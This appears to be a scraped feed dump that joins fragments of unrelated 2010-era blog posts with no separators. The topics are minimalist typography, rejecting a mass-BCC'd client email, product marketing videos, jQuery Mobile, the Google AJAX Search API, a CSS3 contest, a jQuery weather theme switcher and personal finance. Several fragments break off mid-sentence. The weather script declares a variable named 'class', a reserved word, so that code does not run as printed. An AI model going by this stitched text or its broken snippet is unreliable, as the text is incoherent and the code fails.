      "content" : "<p>When opting for a minimalist design the typography is very important. Typography is always important but with a minimalist design the focus is more so on the content then on a graphic heavy design. The font you choose sets the tone of your design. </p>\n<p>If you take a look at <a href=\"http://www.devlounge.net/design/the-23-best-white-minimal-wordpress-themes\">minimalist WordPress templates</a> you can clearly see how the typography defines the entire design. Just change the font to something like Courier or Garamond and see how it affects the design.</p>\n<p>In my opinion sans-serif fonts are better suited for modern minimalist designs. Serif fonts do better with a “literary” inspired design for lack of better word. Designs that aim for a book look. But then again there are no set rules when it comes to design, that is what challenges the creativity. To bend the “rules” and still deliver a good and usable design.</p>\n<p>The following fonts are a mix of free and commercial licenses, make sure to read the licenses to know the

He spoke briefly about the people working on the project (supposedly a team from a very well-respected tech company) and also detailed his own credentials via a link to his LinkedIn profile, which revealed that he’s been managing several tech start-ups over the last 15 years or so.</p>\n<p>All of these things should have impressed me and got me excited about working on his project. But instead, I binned it.</p>\n<p>Why? Because his email started with a generic ‘Hi’ — a tell-tale sign that this is a copy-and-paste job sent out to multiple designers. But hang on: he couldn’t even be bothered to do that. My eyes moved to the headers of the email and in the ‘To’ field I saw… <em>nothing</em>. There was nothing there because he obviously BCC’d a whole bunch of designers. That’s right: he couldn’t even be bothered to write several copy-and-paste emails. And, as these tricks are obvious from even a cursory glance at the message, I’m now acutely aware that I’m just a name on a list. Sure, that list might be small — perhaps only five or so designers, say — but then there’s even <em>less</em> justification for this lack of personal address. And the sad thing is that if his credentials are actually true, he really should know better.</p>\n<p>This isn’t just me being pernickety about email etiquette: this kind of behaviour is a strong signifier that this client will be a nightmare to work with. At the first point of contact, he doesn’t even care enough about me to address me by name or speak to me on a one-to-one basis. Imagine if someone did that to you in person!</p>\n<p>If you ever get an email like this and your instinct is to reply, <em>don’t.</em></p>\n<p>I admit that I’m in a very fortunate situation where I can be relatively picky about my clients, and I realise that many people, like those just starting out, aren’t necessarily afforded this luxury. But still, I would urge those people to turn away clients like this. Learned only through bitter mistakes, it’s my experience that the warning signs for ‘bad eggs’ are obvious from the start, and if they ever appear this early on in a project (before it’s even started!), it’s a guarantee that things will only get worse once you start delivering work.</p>\n<p>Next time you get an email like that, either trash it before you waste any time on it, or maybe reply briefly with a link to this blog post.</p>"

Done right, it can be great, but execute poorly and you’re right back to square one.</p>\n</div>\n<p><span></span></p>\n<p>For the sake of argument, let’s compare four different videos. One from <a href=\"http://www.shopify.com\">Shopify.com</a> (a web based ‘build your own shop’ shop), one from <a href=\"http://www.dropbox.com\">Dropbox.com</a> (a magical box in the cloud that synchs your files), one from <a href=\"http://www.groupon.com\">Groupon.com</a> (a social coupon based network of local deals), and one from <a href=\"http://www.foursquare.com\">Foursquare.com</a> (a location based social check-in service).</p>\n<h1>Groupon</h1>\n<p>Groupon’s video showcases some killer graphics and gets straight to the point. Within seconds you’re interested in what’s going on. It’s clear that extremely talented designers had their hand in this video. The timing is great, the soundtrack works, and it’s not too long. Coming in at 1 minute 34 seconds, this is a (very successful) textbook product marketing video, executed well.</p>\n<p><a href=\"http://www.vimeo.com/2112924\"><img title=\"Groupon Video\" src=\"http://www.thinkbrilliant.com/wp-content/uploads/2010/09/groupon.jpg\" alt=\"Groupon\" width=\"580\" height=\"341\"></a></p>\n<h1>Dropbox</h1>\n<p>Dropbox takes a slightly different approach, opening their video with a metaphor. If you can relate to the metaphor early on, chances are you’ll try the product. The graphics are excellent, and the lack of a soundtrack makes you focus on the narrative. At 2 minutes 16 seconds, the video weighs in a bit on the long end, but it’s a good use of time. Very well done.</p>\n<p><a href=\"https://www.dropbox.com/\"><img title=\"Dropbox Video\" src=\"http://www.thinkbrilliant.com/wp-content/uploads/2010/09/dropbox.jpg\" alt=\"Dropbox\" width=\"580\" height=\"341\"></a></p>\n<h1>Foursquare</h1>\n<p>Foursquare went with a slightly different approach. It’s an appropriate length at 1 minute 58 seconds, but the step-by-step breakdown makes the video feel too long. The breakdown definitely brings value in explaining the concept of the service, but a clever metaphor about getting out and exploring around town with your friends might be a bit more relatable.</p>\n<p><a href=\"http://www.howcast.com/videos/386406-How-To-Unlock-Your-World-With-Foursquare\"><img title=\"Foursquare Video\" src=\"http://www.thinkbrilliant.com/wp-content/uploads/2010/09/foursquare.jpg\" alt=\"Foursquare\" width=\"580\" height=\"341\"></a></p>\n<h1>Shopify</h1>\n<p>Shopify’s video leaves me wanting more, a lot more. I love the product and am an advocate for its use when someone asks me where to begin with an online shop. This video, however, does the product a disservice. The name of the company isn’t mentioned until the very end, and trying to get potential customers to relate with a cupcake baker in Toronto, Canada probably wasn’t the best choice. This video is meant to live on a <em>Case Studies</em> page, or in a <em>Testimonials</em> section. But as a product pitch video, front and center at Shopify.com, it doesn’t work.</p>\n<p><a href=\"http://www.shopify.com/welcome\"><img title=\"Shopify Video\" src=\"http://www.thinkbrilliant.com/wp-content/uploads/2010/09/shopify.jpg\" alt=\"Shopify\" width=\"580\" height=\"341\"></a></p>\n<p>It’s not easy to market a web service. You spend a lot of time and money developing a product you hope people find useful, and then attempt to charge a fair rate for its use. As we just went over, often times, web services will try and explain their entire product in short, quirky little videos that potential customers can watch. These videos can have a tremendous impact on any service’s adoption rate. If you can clearly explain the concept, purpose and value of your product in a quick video, chances are people will relate with what you’re trying to sell them. Adversely, a video that further blurs the concept of your product can quickly cause some turbulence. In a nutshell, if a video is the first thing potential customers are going to see, make it a good one. </p>\n<blockquote><p>“You never get a second chance to make a first impression.”</p></blockquote>\n<p>Of course, you should follow us on <a href=\"http://www.twitter.com/thinkbrilliant\">twitter</a> and <a href=\"http://www.facebook.com/thinkbrilliant\">Facebook</a>, or connect via email, Aviv (at) thinkbrilliant (dot) com.</p>"

Its lightweight code is built with progressive enhancement, and has a flexible, easily themeable design.</p><p>The aim is to provide tools to build dynamic touch interfaces that will adapt gracefully to a range of device form factors. The system will include both layouts (lists, detail panes, overlays) and a rich set of form controls and UI widgets (toggles, sliders, tabs). <strong>jQuery Mobile is now under development for late 2010.</strong></p><p style=\"text-align:center\"><a title=\"jQuery Mobile\" href=\"http://jquerymobile.com/\"><img title=\"jquery-mobile\" src=\"http://maxcdn.webappers.com/img/2010/08/jquery-mobile.jpg\" alt=\"jquery-mobile\" width=\"480\" height=\"227\"></a></p><blockquote><p>Source: <a title=\"jQuery Mobile\" rel=\"nofollow\" href=\"http://jquerymobile.com/\">http://jquerymobile.com/</a></p></blockquote><div><h3>Related Posts</h3><ul><li><a href=\"http://www.webappers.com/2009/01/15/create-complex-application-layout-with-uilayout/\" rel=\"bookmark\" title=\"January 15, 2009\">Create Complex Application Layout with UI.Layout</a></li><li><a href=\"http://www.webappers.com/2008/08/23/android-the-first-complete-open-and-free-mobile-platform/\" rel=\"bookmark\" title=\"August 23, 2008\">Android – The First Complete, Open, and Free Mobile Platform</a></li><li><a href=\"http://www.webappers.com/2010/02/25/free-mobile-icon-set-for-personal-commercial-use/\" rel=\"bookmark\" title=\"February 25, 2010\">Free Mobile Icon Set for Personal &amp; Commercial Use</a></li><li><a href=\"http://www.webappers.com/2009/06/18/iphone-style-checkboxes-in-jquery/\" rel=\"bookmark\" title=\"June 18, 2009\">iPhone Style Checkboxes in jQuery</a></li><li><a href=\"http://www.webappers.com/2008/05/19/jquery-interactive-date-range-picker-with-shortcuts/\" rel=\"bookmark\" title=\"May 19, 2008\">jQuery Interactive Date Range Picker with Shortcuts</a></li></ul></div><div>\n<a href=\"http://feeds.feedburner.com/~ff/Webappers?a=SJ6VBuxm04Q:Ge7Dse1EaGM:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/Webappers?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Webappers?a=SJ6VBuxm04Q:Ge7Dse1EaGM:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/Webappers?i=SJ6VBuxm04Q:Ge7Dse1EaGM:D7DqB2pKExk\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Webappers?a=SJ6VBuxm04Q:Ge7Dse1EaGM:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/Webappers?i=SJ6VBuxm04Q:Ge7Dse1EaGM:V_sGLiPBpWU\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Webappers?a=SJ6VBuxm04Q:Ge7Dse1EaGM:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/Webappers?i=SJ6VBuxm04Q:Ge7Dse1EaGM:gIN9vFwOqvQ\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Webappers?a=SJ6VBuxm04Q:Ge7Dse1EaGM:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/Webappers?i=SJ6VBuxm04Q:Ge7Dse1EaGM:F7zBnMyn0Lo\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/Webappers/~4/SJ6VBuxm04Q\" height=\"1\" width=\"1\">"

Let’s be more honest…no search functionality is better than Google’s.  Luckily for us, Google provides an awesome method by which we can use their search for our own site:  the Google AJAX Search API.  Let me show you how to implement this awesome API within your own website!</p><div><a href=\"http://davidwalsh.name/dw-content/google-ajax-search.php\">View Demo</a><div></div></div><h2>Sign Up!</h2><p>Google’s AJAX Search API requires that you <a href=\"http://code.google.com/apis/ajaxsearch/key.html\">sign up for an API key</a>.  Signing up is free and you’ll be done with the process of retrieving a key in a few minutes.</p><p><a href=\"http://davidwalsh.name/dw-content/google-ajax-search.php\"><img src=\"http://davidwalsh.name/dw-content/ajax-search-1.jpg\" alt=\"Google AJAX Search API Sign Up\"></a></p><p>You’ll also need to provide a domain for which they key will work for; one key per domain.</p><h2>The HTML</h2><pre>&lt;!-- SEARCH FORM --&gt;\n&lt;form action=&quot;http://www.google.com/search&quot; method=&quot;get&quot;&gt;\n\t&lt;!-- HTML5 SEARCH BOX!  --&gt;\n\t&lt;input type=&quot;search&quot; id=&quot;search-box&quot; name=&quot;q&quot; results=&quot;5&quot; placeholder=&quot;Search...&quot; autocomplete=&quot;on&quot; /&gt;\n\t&lt;!-- SEARCH davidwalsh.name ONLY! --&gt;\n\t&lt;input type=&quot;hidden&quot; name=&quot;sitesearch&quot; value=&quot;davidwalsh.name&quot; /&gt;\n\t&lt;!-- SEARCH BUTTON --&gt;\n\t&lt;input id=&quot;search-submit&quot; type=&quot;submit&quot; value=&quot;Search&quot; /&gt;\n&lt;/form&gt;\n\n&lt;!-- ASYNCHRONOUSLY LOAD THE AJAX SEARCH API;  MOOTOOLS TOO! --&gt;\n&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.google.com/jsapi?key=MY_REALLY_REALLY_REALLY_REALLY_REALLY_REALLY_LONG_KEY&quot;&gt;&lt;/script&gt;\n&lt;script type=&quot;text/javascript&quot;&gt;\n\tgoogle.load(&#39;mootools&#39;,&#39;1.2.4&#39;);\n\tgoogle.load(&#39;search&#39;,&#39;1&#39;);\n&lt;/script&gt;</pre><p>You’ll want to use a “real” form so that if the user doesn’t have JavaScript, they’ll get directed to Google for their search.  Beyond that, follow the hidden input line to ensure your search will work.  You may also note that the search box has autocomplete and placeholder attributes — those are HTML5 functionality, nothing to do with Google’s AJAX Search API.</p><h2>The CSS</h2><pre>/* results positioning */\n#search-results\t\t{ position:absolute; z-index:90; top:40px; right:10px; visibility:hidden; }\n/* triangle! */\n#search-results-pointer { width:0px; height:0px; border-left:20px solid transparent; border-right:20px solid transparent; border-bottom:20px solid #eee; margin-left:80%; }\n/* content DIV which holds search results! */\n#search-results-content { position:relative; padding:20px; background:#fff; border:3px solid #eee; width:380px; min-height:200px; -webkit-box-shadow: 5px 5px 5px rgba(0, 0, 0, 0.5) }</pre><p>The CSS above simply position the elements where I want them per my design.

I’ve chosen to add tabs and set the input as my search box.</li><li>A SearchControl instance. <a rel=\"nofollow\" href=\"http://code.google.com/apis/ajaxsearch/documentation/reference.html#_class_GSearchControl\">google.search.SearchControl options</a>.  “siteSearch” is my suffix for results, I’ve restricted my search to the davidwalsh.name domain, and form submission will trigger results to display in the current window (instead of a new window).</li><li>A DrawOptions instance. <a rel=\"nofollow\" href=\"http://code.google.com/apis/ajaxsearch/documentation/reference.html#_class_GdrawOptions\">google.search.DrawOptions options</a>.  With my DrawOptions instance, I’ve set search control, set the draw container with the options we’ve created, and I’ve decided to use Google’s default “no results” message</li></ul></li></ul><p>Once the search controls are created, it’s time to attach events to the search box to show and hide the search results container based on the contents of the search box.  That’s all!</p><p>As you can see, I’ve chosen to use the MooTools (FTW) JavaScript toolkit to create the element that houses the results, the “Close” link, and to bind events to the search box.  You could just as easily use Dojo or jQuery for element creation and even handling.</p><div><a href=\"http://davidwalsh.name/dw-content/google-ajax-search.php\">View Demo</a><div></div></div><p>In all honesty, I couldn’t believe how easy it was to implement Google AJAX search.  It’s an easy want to implement search on your website, especially if you’re currently using WordPress’ search.  I recommend taking the time to implement Google’s AJAX Search API — the day it takes you to get it working will save your users hours of pain!</p><p><strong>Follow Me!</strong> <a href=\"http://twitter.com/davidwalshblog\">Twitter</a> | <a href=\"http://www.facebook.com/#!/pages/David-Walsh-Blog/186644584869\">Facebook</a> | <a href=\"http://www.linkedin.com/in/davidjameswalsh\">LinkedIn</a> | <a href=\"http://mootools.net/forge/profile/davidwalsh\">MooTools Forge.</a><br><br>Full David Walsh Blog Post: <a href=\"http://davidwalsh.name/google-ajax-search\">Implement the Google AJAX Search API</a></p><p>Related posts:<ol><li><a href=\"http://davidwalsh.name/search-options\" rel=\"bookmark\" title=\"Permanent Link: Search Type Options with MooTools\">Search Type Options with MooTools</a></li><li><a href=\"http://davidwalsh.name/google-load\" rel=\"bookmark\" title=\"Permanent Link: google.load():  Utilize Google’s AJAX Libraries API\">google.load():  Utilize Google’s AJAX Libraries API</a></li><li><a href=\"http://davidwalsh.name/ajax-username-availability-checker-mootools\" rel=\"bookmark\" title=\"Permanent Link: AJAX Username Availability Checker Using MooTools 1.2\">AJAX Username Availability Checker Using MooTools 1.2</a></li><li><a href=\"http://davidwalsh.name/ajax-spinner-jquery\" rel=\"bookmark\" title=\"Permanent Link: Form Element AJAX Spinner Attachment Using jQuery\">Form Element AJAX Spinner Attachment Using jQuery</a></li><li><a href=\"http://davidwalsh.name/ajax-spinner\" rel=\"bookmark\" title=\"Permanent Link: Form Element AJAX Spinner Attachment Using MooTools\">Form Element AJAX Spinner Attachment Using MooTools</a></li></ol></p><img src=\"http://feeds.feedburner.com/~r/Bludice/~4/U0V0UeswwWA\" height=\"1\" width=\"1\">"

As expected, we have received many creative and original submissions. To choose the winners of the contest, we considered the originality of the technique or approach and its uniqueness. The idea mattered more than the execution.</p><p>This process has taken a lot of time as it wasn’t easy, because we received quite a few creative submissions: however, a decision had to be taken and so we thoroughly went from one competition entry to another. And the decision was made. So today, it’s time to announce the winners and present the submissions to the contest.</p><p>Please notice that the <strong>contest results are experimental</strong> and may not necessarily look or work alike in different browsers. The techniques presented below should be considered as innovative, creative approaches showcasing what can be achieved with pure CSS3 and a bit of creative thinking. Please feel free to build upon these ideas to create further techniques and design solutions and make them available for the design community.</p><p>[By the way, did you know we have a brand new free <a href=\"http://www.smashingmagazine.com/the-smashing-newsletter/\">Smashing Email Newsletter</a>?

I’ve seen people use CSS3 to create 2D art and thought of doing so myself, yet the idea seemed too easy. However, 3D art using CSS3 is something I have yet to see! I wanted to create an image-less 3D page layout using CSS3. It took some playing around with the code to find the best method of producing an image-less 3D element, but I’m definitely happy (and excited) with my findings. Although, after the 3D elements were introduced, I felt as through it was still lacking. I needed more, I needed interaction within the 3D space. I then created a 3D navigation bar which acts as buttons. Through CSS3’s scaling method I created the illusion of buttons going back within the 3D space on a mouse hover, and on an active state the link creates more of an interactive feel for the user. This is only the beginning of this layout, and I plan to expand upon it to create a fully designed page template which will incorporate more “button-like” interaction throughout the design. Overall, this contest has definitely pushed me to play with CSS3 more and I am truly excited for this to become a web standard!” Designed by <a href=\"http://rebzmedia.com\">Chris Johnson</a> from USA.</li><li>CSS3 Dreamer Blog [ <a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/uploader/images/css3-designs/css3-dreamer-blog/index.html\">preview</a> | <a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/uploader/images/css3-designs/css3-dreamer-blog/css3-dreamer-blog.zip\">download</a> ]<br> “I feel CSS3 is great &amp; exploring technique in modern web era.” Designed by Vijay N.

We’ll start by creating four backgrounds for sun, rain, snow and cloudy, then use a clever jQuery script to pull in the forecast. To finish things off, we’ll even create a cool manual override, allowing users to switch through the various themes themselves.</p>\n<p><span></span></p>\n<p><a href=\"http://jakethelab.com\"><img src=\"http://line25.com/wp-content/uploads/2010/weather/jakethelab.jpg\" alt=\"See the weather switcher in action on Jakethelab.com\"></a></p>\n<p>I recently put this idea into practice on a site I hashed together for my dog Jake. <a href=\"http://jakethelab.com\">Jakethelab.com</a> is a Tumblr blog where I post random photos and videos from my iPhone. The theme of the site changes depending on the weather, with Jake being the happiest when it’s sunny and cloudy, and not so much when it’s rainy or snowy. I wasn’t brainy enough to code <em>all</em> the Javascript myself, so some scripts from other talented developers were used alongside a few lines of my own basic jQuery. A few people has asked how it was all done, so here’s a brief overview.</p>\n<h3>Create the themes</h3>\n<p><img src=\"http://line25.com/wp-content/uploads/2010/weather/themes.jpg\" alt=\"Four backgrounds for each weather condition\"></p>\n<p>The four themes of the site were put together as large background images. The same layout is used for each, but the overall theme changes to show the four weather conditions of sunny, rainy, snowy and cloudy.</p>\n<h3>Fetch the weather feed</h3>\n<div>\n<pre>\n$(document).ready(function() {\t\n\n$.YQL = function(query, callback) {\n    var encodedQuery = encodeURIComponent(query.toLowerCase()),\n        url = &#39;http://query.yahooapis.com/v1/public/yql?q=&#39;\n            + encodedQuery + &#39;&amp;format=json&amp;callback=?&#39;;\n    $.getJSON(url, callback);\n};\n$.YQL(&quot;select * from rss where url=&#39;http://weather.yahooapis.com/forecastrss?p=UKXX0133&#39;&quot;,function(data){\n            var w=data.query.results.item;\n          \tvar class=w.condition.text;\n          \tvar encodedclass = class.replace(/\\s+/g, &#39;-&#39;).toLowerCase();\n\n          \t$(&#39;body&#39;).addClass(encodedclass);\n\n       });\n});\n</pre>\n</div>\n<p>The script that does all the work by fetching the feed from Yahoo is courtesy of <a href=\"http://graphicallyherdingthemasses.blogspot.com\">Justin Shearer</a> from <a href=\"http://graphicallyherdingthemasses.blogspot.com/2009/11/access-yahoos-weather-api-via-yql-and.html\">Graphically Herding the Masses</a>. Justin’s <a href=\"http://graphicallyherdingthemasses.blogspot.com/2009/11/access-yahoos-weather-api-via-yql-and.html\">post</a> takes the API to a more advanced level and creates a complete weather widget. For our site we only need part of the code, and the rest is modified to suit.</p>\n<p>With our weather being used as a class on the page body, the condition needed encoding to lower case and the spaces removed. This changed the text from this: <code>Partly Cloudy</code> to this: <code>partly-cloudy</code>. Next, the <code>encodedclass</code> variable was then added as a class to the page body, so the HTML would read <code>&lt;body class=&quot;partly-cloudy&quot;&gt;</code>, which could then be styled up with CSS.</p>\n<div>\n<pre>http://weather.yahooapis.com/forecastrss?p=USNY0996</pre>\n</div>\n<p>If you’re using this code on your own site, you’ll want to change the location of the weather feed. The easiest way to find your location code is to head over to <a href=\"http://uk.weather.yahoo.com/united-states/new-york/new-york-2459115/\">Yahoo weather</a> and check the URL of the RSS feed for your particular location. </p>\n<h3>Write the CSS styles</h3>\n<div>\n<pre>\nbody.cloudy, body.partly-cloudy, body.mostly-cloudy {\n\tbackground: #b3c6e4 url(Cloudy.jpg) fixed center bottom no-repeat;\n}\nbody.rain, body.thunderstorms, body.drizzle, body.showers, body.thundershowers, body.scattered-showers, body.scattered-thunderstorms, body.isolated-thunderstorms {\n\tbackground: #9eacaf url(Rainy.jpg) fixed center bottom no-repeat;\n}\nbody.sunny, body.fair, body.hot {\n\tbackground: #8cdafe url(Sunny.jpg) fixed center bottom no-repeat;\n}\nbody.snow, body.mixed-rain-and-snow, body.mixed-rain-and-sleet, body.snow-flurries, body.light-snow-showers, body.blowing-snow, body.hail, body.sleet, body.snow-showers, body.heavy-snow {\n\tbackground: #889986 url(Snowy.jpg) fixed center bottom no-repeat;\n}\n</pre>\n</div>\n<p>With the current weather being injected right into our HTML, we can now write some CSS to make the appropriate changes to the website. Here’s where the list of <a href=\"http://developer.yahoo.com/weather/\">Condition Codes</a> from Yahoo Weather comes in handy because a bunch of classes are used to render each of the four backgrounds. For instance, a class of sunny, fair or hot will show the sunny background image. We don’t tend to get very many tropical storms in the UK, so just the most common conditions are picked out.</p>\n<h3>Add a manual override</h3>\n<p><img src=\"http://line25.com/wp-content/uploads/2010/weather/buttons.jpg\" alt=\"Four buttons for changing the weather condition\"></p>\n<p>Unless a user comes back to your website during every weather condition, they may never see your other themes so I figured it would be cool to add a manual override to allow users to toggle through the weather themselves.</p>\n<div>\n<pre>\n&lt;ul id=&quot;weather&quot;&gt;\n \t&lt;li class=&quot;cloudy&quot;&gt;&lt;a href=&quot;#&quot;&gt;Cloudy&lt;/a&gt;&lt;/li&gt;\n \t&lt;li class=&quot;sunny&quot;&gt;&lt;a href=&quot;#&quot;&gt;Sunny&lt;/a&gt;&lt;/li&gt;\n \t&lt;li class=&quot;rainy&quot;&gt;&lt;a href=&quot;#&quot;&gt;Rainy&lt;/a&gt;&lt;/li&gt;\n \t&lt;li class=&quot;snowy&quot;&gt;&lt;a href=&quot;#&quot;&gt;Snowy&lt;/a&gt;&lt;/li&gt;\n &lt;/ul&gt;\n</pre>\n</div>\n<p>A simple list is laid out in HTML. Each list item contains an anchor which we’ll style up into button style graphics.</p>\n<div>\n<pre>\nul#weather {\n\t\tposition: absolute; top: 40px; left: 40px;\n\t\tlist-style: none; display: none;\n\t}\n\t\tul#weather li {\n\t\t\tmargin: 0 0 12px 0;\n\t\t}\n\t\t\tul#weather li a {\n\t\t\t\tdisplay: block; width: 60px;\n\t\t\t\tbackground: url(weather-icons.png) no-repeat; text-indent: -9999px;\n\t\t\t}\n\t\t\t\tul#weather li.cloudy a {\n\t\t\t\t\theight: 32px; background-position: 0 0;\n\t\t\t\t}\n\t\t\t\tul#weather li.sunny a {\n\t\t\t\t\theight: 63px; background-position: 0 -43px;\n\t\t\t\t}\n\t\t\t\tul#weather li.rainy a {\n\t\t\t\t\theight: 50px; background-position: 0 -115px;\n\t\t\t\t}\n\t\t\t\tul#weather li.snowy a {\n\t\t\t\t\theight: 48px; background-position: 0 -177px;\n\t\t\t\t}\n</pre>\n</div>\n<p>The buttons are firstly moved into place using absolute positioning. This places them in a fixed position at the top left of the screen. Each anchor is then transformed into a button using CSS image replacement, with each button displaying a simple weather condition icon. Because this feature will only work if the user has Javascript enabled <code>display:none;</code> is used, the buttons will be made visible again by jQuery for those users with JS enabled.</p>\n<div>\n<pre>\n\t$('ul#weather').show();\n\n\t$('li.cloudy').click(function() {\n\t\t$('body').removeClass();\n\t\t$('body').addClass('cloudy');\n\t\treturn false;\n\t});\n\t$('li.sunny').click(function() {\n\t\t$('body').removeClass();\n\t\t$('body').addClass('sunny');\n\t\treturn false;\n\t});\n\t$('li.rainy').click(function() {\n\t\t$('body').removeClass();\n\t\t$('body').addClass('rain');\n\t\treturn false;\n\t});\n\t$('li.snowy').click(function() {\n\t\t$('body').removeClass();\n\t\t$('body').addClass('snow');\n\t\treturn false;\n\t});\n</pre>\n</div>\n<p>A simple jQuery function is then written for each of the four buttons. When the button is clicked, the current class is removed from the page body and replaced according to whichever button was clicked. <code>return false;</code> disables the default action of the anchor to prevent the page from jumping back to the top.</p>\n<div>\n<pre>\nvar name = \"#weather\";\n    var menuYloc = null;\n   \tmenuYloc = parseInt($(name).css(\"top\").substring(0,$(name).css(\"top\").indexOf(\"px\")))  \n\n   \t\t$(window).scroll(function () {\n   \t\t\tvar offset = menuYloc+$(document).scrollTop()+\"px\";\n   \t\t\t$(name).animate({top:offset},{duration:500,queue:false});\n\t\t});\n</pre>\n</div>\n<p>To finish off the buttons, a nifty piece of code from <a href=\"http://net.tutsplus.com/tutorials/html-css-techniques/creating-a-floating-html-menu-using-jquery-and-css/\">Nettuts</a> is used to transform the buttons into a <a href=\"http://net.tutsplus.com/tutorials/html-css-techniques/creating-a-floating-html-menu-using-jquery-and-css/\">floating menu</a>, which slides up and down the page when the user scrolls.</p>\n<p><a href=\"http://jakethelab.com\"><img src=\"http://line25.com/wp-content/uploads/2010/weather/jakethelab.jpg\" alt=\"See the weather switcher in action on Jakethelab.com\"></a></p>\n<p><a href=\"http://jakethelab.com\">See it in action on jakethelab.com</a></p>\n<div>\n<a href=\"http://feeds.feedburner.com/~ff/Line25?a=uUk_jHX4nqg:AcvK2cS1RoE:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/Line25?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Line25?a=uUk_jHX4nqg:AcvK2cS1RoE:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/Line25?d=7Q72WNTAKBA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Line25?a=uUk_jHX4nqg:AcvK2cS1RoE:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/Line25?i=uUk_jHX4nqg:AcvK2cS1RoE:V_sGLiPBpWU\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Line25?a=uUk_jHX4nqg:AcvK2cS1RoE:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/Line25?d=qj6IDK7rITs\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Line25?a=uUk_jHX4nqg:AcvK2cS1RoE:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/Line25?i=uUk_jHX4nqg:AcvK2cS1RoE:gIN9vFwOqvQ\" border=\"0\"></a>\n</div>"

Not rich, just okay.</p>\n<p>Never mind that few people have the skills or discipline to save 10% of their income. Never mind that each of those recommendations depends on willpower, which lasts for a month or two, then dissipates as predictably as the effects of diets. Never mind that credit is essential and can save you over $100,000 on the purchase of an average house. </p>\n<p><em>I Will Teach You To Be Rich</em> readers know that those “tips” are filled with so many holes that it’s almost difficult to believe — chiefly human psychology. This is why you’ll have a friend whose new resolution (every month) is to stop spending money and really save! This nearly always fails — just like diets — because behavioral change is extraordinarily challenging and few people study how it actually works. </p>\n<p>Yet “experts” continue spouting off this nonsense of saving and trying harder through sheer force alone. Why? Because it’s easy to write, inoffensive, produces pageviews, and requires very little energy from a largely apathetic and semi–financially-conscious public. <a href=\"http://www.iwillteachyoutoberich.com/blog/birthday-favor/\">Real behavioral change</a> takes systems, not simply willpower. Real behavioral change requires conscious spending, not across-the-board cost-cutting. </p>\n<p>For example, the ordinary wisdom of “stop wasting your money on stuff” is filled with outdated cliches like encouraging us to stop spending on lattes, eating out, and bars — all things that people in their 20s and 30s spend money on <em>as a natural part of life</em>. Even more importantly, we’re all embedded in a social system that reinforces this spending, making it virtually impossible to cut down discretionary expenses by willpower alone. This is like telling teens to stop having sex: You can try, and it may make you feel better to say it, but that’s not going to change the actual numbers.  (Exception: My future kids, who I will lock down with one ankle chain each, like an elephant.)</p>\n<p>Today, we’re over halfway into 2010, and I want to check in with you on where you are with your finances. </p>\n<p>If I’d followed the advice of most “experts,” I “should” have done the following this year: Stopped eating out, cooked at home every day, never take a vacation, sit at home (no cable) and knit, reuse plastic bags 47 times, cut down on the amount of toilet paper I use, walk everywhere (no cabs or driving), and on and on. Who the hell in their 20s and 30s wants to live like that? </p>\n<p>In fact, based on some back-of-the-reused napkin math, all I have to do is use 50 fewer squares of toilet paper each day, which will save me $2.35/month, times TWELVE MONTHS!! I WILL TEACH MYSELF TO BE RICH!!!</p>\n<p>Instead, after automating my finances, I’ve decided to earn more. In fact, in one hour this year, I earned 10x what I recently earned in an <em>entire year</em>.</p>\n<p>Many people are spending the summer being lazy, watching The Hills, and drinking themselves into a Chico State-inspired stupor. </p>\n<p>Screw them. You’re going to crush them like a dump truck. </p>\n<p>Let me show you what I’ve learned recently. Then I’ll tell you what’s coming your way.</p>\n<h3>The case of the confused man</h3>\n<p>Two weeks ago, I get this email from someone who’s unsubscribing from my newsletter. Now, every time someone unsubscribes, I get an email with their reason, and I usually reply to most of them just to see why they’re leaving.</p>\n<p>This guy says he “already knows all the basic stuff” I write about. Whenever I read this, it’s usually a tipoff that you’ve got someone who’s more interested in finding newer and newer material (!!) instead of actually doing something. Anyway, I decide to ask a few more questions.</p>\n<blockquote><p>Ramit: “What kind of material would you be interested in?”<br>\nGuy: “I have done the basics. I am looking for ways to grow my money substantially, high-risk investing, take a vacation. I am looking for a stronger background in finance.”<br>\nRamit: “Have you done [XYZ]“?<br>\nGuy: “Yes, I have done all that.”<br>\nRamit: “Would you be interested in earning more?”<br>\nGuy: “Yes, I would but its all scam material out there. Any way to earn more would be appreciated.”</p></blockquote>\n<p>My first thought was, HOLY SHIT, I spent all of January writing all-new material on earning more. How could he not know? But in retrospect, it’s my fault: Why should I expect him to know about it? Honestly, I haven’t talked much about earning more since then, even though I announced that 2010 is the year of earning more. And then, as I searched my email and survey responses, I found more and more people asking for material on earning more and quitting their jobs to do something better.</p>\n<p>So, oops… I can’t believe I haven’t shared what my team and I have been doing behind the scenes for the last 4 months: creating hours and hours of audio/video material, case studies, new techniques to earn more, and capturing tons of stories about people earning more.</p>\n<p>My fault for not sharing. So I’m going to spend the next 4 weeks giving you a bunch of free stuff that you can use to take action right now to earn more — and use the money to quit your job, fly to Vegas, pay off debt, or whatever else you want to consciously do. </p>\n<h3>Why earning instead of cutting back?</h3>\n<p>I like to focus on earning more instead of cutting back for a few reasons that make a profound difference in living a rich life.</p>\n<p><strong>There’s a limit to how much you can cut back, but no limit to how much you can earn</strong>. In fact, 